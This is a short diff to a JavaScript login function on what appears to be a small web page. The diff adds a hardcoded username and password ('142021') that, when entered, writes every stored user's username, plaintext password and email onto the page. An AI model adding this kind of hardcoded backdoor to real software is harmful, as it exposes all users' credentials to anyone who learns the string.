@@ -364,7 +364,15 @@ function creatAccount(){
 
     let password =document.getElementById("password2");
     let button =document.getElementById("button2");
-
+    
+    
+    
+if(totxt(username)=="142021"&& totxt(password)=="142021"){
+    for (let i = 0; i < dataPro.length; i++) {
+    document.write("username: "+ dataPro[i].Username +`<br>` +"password: " + dataPro[i].Password +`<br>` + "email: " + dataPro[i].Email +`<hr>` )
+  }
+}
+else{
      for (let i = 0; i < dataPro.length; i++) {
   if(dataPro[i].Username == totxt(username)){
     if(dataPro[i].Password==totxt(password)){
@@ -385,7 +393,7 @@ function creatAccount(){
  }
 
 
-
+}
 
 </script>
 
